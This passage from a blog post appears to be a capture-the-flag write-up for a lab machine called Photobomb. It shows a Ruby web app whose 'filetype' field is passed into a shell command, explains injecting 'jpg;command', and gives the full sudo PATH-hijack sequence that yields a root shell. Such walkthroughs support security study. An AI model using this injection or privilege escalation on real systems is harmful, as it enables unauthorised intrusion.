+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    images += &#39;&lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>photo<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#e6db74">&#39; + img_name + &#39;</span><span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#e6db74">&#39; + img_name + &#39;</span><span style="color:#e6db74">&#34;&#39; + checked + &#39;/&gt;&lt;label for=&#34;</span><span style="color:#e6db74">&#39; + img_name + &#39;</span><span style="color:#e6db74">&#34; style=&#34;</span>background<span style="color:#f92672">-</span><span style="color:#e6db74">image</span>: url(<span style="color:#e6db74">&#39; + img_src + &#39;</span>)<span style="color:#e6db74">&#34;&gt;&lt;/label&gt;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    checked = &#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  html = &lt;&lt;~HTML
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;title&gt;Photobomb&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;link type=&#34;</span>text<span style="color:#f92672">/</span>css<span style="color:#e6db74">&#34; rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>styles<span style="color:#f92672">.</span>css<span style="color:#e6db74">&#34; media=&#34;</span>all<span style="color:#e6db74">&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;div id=&#34;</span>container<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h1&gt;&lt;a href=&#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;form id=&#34;</span>photo<span style="color:#f92672">-</span>form<span style="color:#e6db74">&#34; action=&#34;</span><span style="color:#f92672">/</span>printer<span style="color:#e6db74">&#34; method=&#34;</span>post<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h3&gt;Select an image&lt;/h3&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;fieldset id=&#34;</span>image<span style="color:#f92672">-</span>wrapper<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      </span><span style="color:#e6db74">#{</span>images<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/fieldset&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;fieldset id=&#34;</span>image<span style="color:#f92672">-</span>settings<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;label for=&#34;</span>filetype<span style="color:#e6db74">&#34;&gt;File type&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;select name=&#34;</span>filetype<span style="color:#e6db74">&#34; title=&#34;</span><span style="color:#66d9ef">JPGs</span> work on most printers, but some people think <span style="color:#66d9ef">PNGs</span> give better quality<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;option value=&#34;</span>jpg<span style="color:#e6db74">&#34;&gt;JPG&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;option value=&#34;</span>png<span style="color:#e6db74">&#34;&gt;PNG&lt;/option&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/select&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;div class=&#34;</span>product<span style="color:#f92672">-</span>list<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">3000</span>x2000<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">3000</span>x2000<span style="color:#e6db74">&#34; checked=&#34;</span>checked<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">3000</span>x2000<span style="color:#e6db74">&#34;&gt;3000x2000 - mousemat&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">1000</span>x1500<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">1000</span>x1500<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">1000</span>x1500<span style="color:#e6db74">&#34;&gt;1000x1500 - mug&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">600</span>x400<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">600</span>x400<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">600</span>x400<span style="color:#e6db74">&#34;&gt;600x400 - phone cover&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">300</span>x200<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">300</span>x200<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">300</span>x200<span style="color:#e6db74">&#34;&gt;300x200 - keyring&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">150</span>x100<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">150</span>x100<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">150</span>x100<span style="color:#e6db74">&#34;&gt;150x100 - usb stick&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;input type=&#34;</span>radio<span style="color:#e6db74">&#34; name=&#34;</span>dimensions<span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">30</span>x20<span style="color:#e6db74">&#34; id=&#34;</span><span style="color:#ae81ff">30</span>x20<span style="color:#e6db74">&#34;/&gt;&lt;label for=&#34;</span><span style="color:#ae81ff">30</span>x20<span style="color:#e6db74">&#34;&gt;30x20 - micro SD card&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/fieldset&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;div class=&#34;</span>controls<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;button type=&#34;</span>submit<span style="color:#e6db74">&#34;&gt;download photo to print&lt;/button&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTML
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  content_type :html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  return html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">post &#39;/printer&#39; do
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  photo = params[:photo]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  filetype = params[:filetype]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  dimensions = params[:dimensions]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # handle inputs
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  if photo.match(/\.{2}|\//)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    halt 500, &#39;Invalid photo.&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  if !FileTest.exist?( &#34;</span>source_images<span style="color:#f92672">/</span><span style="color:#e6db74">&#34; + photo )
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    halt 500, &#39;Source photo does not exist.&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  if !filetype.match(/^(png|jpg)/)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    halt 500, &#39;Invalid filetype.&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  if !dimensions.match(/^[0-9]+x[0-9]+$/)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    halt 500, &#39;Invalid dimensions.&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  case filetype
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  when &#39;png&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    content_type &#39;image/png&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  when &#39;jpg&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    content_type &#39;image/jpeg&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  filename = photo.sub(&#39;.jpg&#39;, &#39;&#39;) + &#39;_&#39; + dimensions + &#39;.&#39; + filetype
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  response[&#39;Content-Disposition&#39;] = &#34;</span>attachment; filename<span style="color:#f92672">=</span><span style="color:#75715e">#{filename}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>exists?(<span style="color:#e6db74">&#39;resized_images/&#39;</span> <span style="color:#f92672">+</span> filename)
+</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert source_images/&#39;</span> <span style="color:#f92672">+</span> photo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; -resize &#39;</span> <span style="color:#f92672">+</span> dimensions <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; resized_images/&#39;</span> <span style="color:#f92672">+</span> filename
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;Executing: </span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    system(command)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;File already exists.&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>exists?(<span style="color:#e6db74">&#39;resized_images/&#39;</span> <span style="color:#f92672">+</span> filename)
+</span></span><span style="display:flex;"><span>    halt <span style="color:#ae81ff">200</span>, {}, <span style="color:#66d9ef">IO</span><span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;resized_images/&#39;</span> <span style="color:#f92672">+</span> filename)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#message = &#39;Failed to generate a copy of &#39; + photo + &#39; resized to &#39; + dimensions + &#39; with filetype &#39; + filetype</span>
+</span></span><span style="display:flex;"><span>  message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Failed to generate a copy of &#39;</span> <span style="color:#f92672">+</span> photo
+</span></span><span style="display:flex;"><span>  halt <span style="color:#ae81ff">500</span>, message
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><ul>
+<li>After reviewing the above code:</li>
+<li>Th web application execute a native linux command <code>convert</code> to resize the image</li>
+<li>The web application validates the <code>filetype</code>, if it starts with <code>jpg or png</code> only</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span>filetype<span style="color:#f92672">.</span>match(<span style="color:#e6db74">/^(png|jpg)/</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><ul>
+<li>And then the web application take the <code>filetype</code> and concatenate it with the rest of the command:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span> command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;convert source_images/&#39;</span> <span style="color:#f92672">+</span> photo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; -resize &#39;</span> <span style="color:#f92672">+</span> dimensions <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; resized_images/&#39;</span> <span style="color:#f92672">+</span> filename
+</span></span><span style="display:flex;"><span>    puts <span style="color:#e6db74">&#34;Executing: </span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    system(command)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><ul>
+<li>On linux we can excute two command in parallel using the <code>;</code> operator:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># command1;command2</span>
+</span></span><span style="display:flex;"><span>ls;pwd
+</span></span></code></pre></div><ul>
+<li>Using this concept, we can execute commands on the server by entering the following <code>filetype</code>: <code>jpg;command</code></li>
+</ul>
+<h2 id="privilege-escalation-road-to-root">Privilege Escalation (Road to root):</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> wizard on photobomb:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User wizard may run the following commands on photobomb:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>. /opt/.bashrc
+</span></span><span style="display:flex;"><span>cd /home/wizard/photobomb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># clean up log files</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -s log/photobomb.log <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> ! <span style="color:#f92672">[</span> -L log/photobomb.log <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span></span><span style="display:flex;"><span>  /usr/bin/truncate -s0 log/photobomb.log
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># protect the priceless originals</span>
+</span></span><span style="display:flex;"><span>find source_images -type f -name <span style="color:#e6db74">&#39;*.jpg&#39;</span> -exec chown root:root <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wizard@photobomb:~/photobomb$
+</span></span></code></pre></div><ul>
+<li>We can run the <code>cleanup.sh</code> sript with sudo without password</li>
+<li>Let&rsquo;s analyse the <code>cleanup.sh</code> script:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cleanup.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>. /opt/.bashrc
+</span></span><span style="display:flex;"><span>cd /home/wizard/photobomb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># clean up log files</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -s log/photobomb.log <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> ! <span style="color:#f92672">[</span> -L log/photobomb.log <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span></span><span style="display:flex;"><span>  /usr/bin/truncate -s0 log/photobomb.log
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># protect the priceless originals</span>
+</span></span><span style="display:flex;"><span>find source_images -type f -name <span style="color:#e6db74">&#39;*.jpg&#39;</span> -exec chown root:root <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>The script find all files that ends with .<code>jpg</code> inside the <code>source_images</code> directory and change the files owner to the root.</p>
+</li>
+<li>
+<p>This script run as a cronjob:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wizard@photobomb:~/photobomb/source_images$ crontab -l
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Edit this file to introduce tasks to be run by cron.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Each task to run has to be defined through a single line</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># indicating with different fields when the task will be run</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and what command to run for the task</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To define the time you can provide concrete values for</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># minute (m), hour (h), day of month (dom), month (mon),</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Notice that tasks will be started based on the cron&#39;s system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># daemon&#39;s notion of time and timezones.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output of the crontab jobs (including errors) is sent through</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># email to the user the crontab file belongs to (unless redirected).</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For example, you can run a backup of all your user accounts</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># at 5 a.m every week with:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># For more information see the manual pages of crontab(5) and cron(8)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h  dom mon dow   command</span>
+</span></span><span style="display:flex;"><span>*/5 * * * * sudo /opt/cleanup.sh
+</span></span></code></pre></div><ul>
+<li>If a non-privileged user can run a script with <code>sudo</code> without a password and the script uses a binary without specifying <strong>the full path to the binary</strong> (<code>find</code> in our case), the non-privileged user could potentially elevate their privileges by modifying the script to run a different binary with the same name as the original binary. For example, if the script uses the <code>cp</code> command without specifying the full path, the user could create a malicious binary called <code>cp</code> in a directory that is earlier in the <code>PATH</code> environment variable than the real <code>cp</code> binary, and then run the script with <code>sudo</code>. This would cause the script to run the malicious <code>cp</code> binary instead of the real one, potentially allowing the user to execute arbitrary code with elevated privileges.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wizard@photobomb:~$ echo bash &gt; find
+</span></span><span style="display:flex;"><span>wizard@photobomb:~$ ls
+</span></span><span style="display:flex;"><span>find  photobomb  user.txt
+</span></span><span style="display:flex;"><span>wizard@photobomb:~$ chmod +x find
+</span></span><span style="display:flex;"><span>wizard@photobomb:~$ sudo PATH<span style="color:#f92672">=</span>$PWD:$PATH /opt/cleanup.sh
+</span></span><span style="display:flex;"><span>root@photobomb:/home/wizard/photobomb# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@photobomb:/home/wizard/photobomb# cd
+</span></span><span style="display:flex;"><span>root@photobomb:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span></code></pre></div><h1 id="rooted-thanks-for-reading">Rooted, Thanks For Reading!</h1>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/Hassan-Al-Achek" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/0xh41" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.instagram.com/hassanalachek/" rel="me" title="Instagram"><i data-feather="instagram"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2022  © 0xh41 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
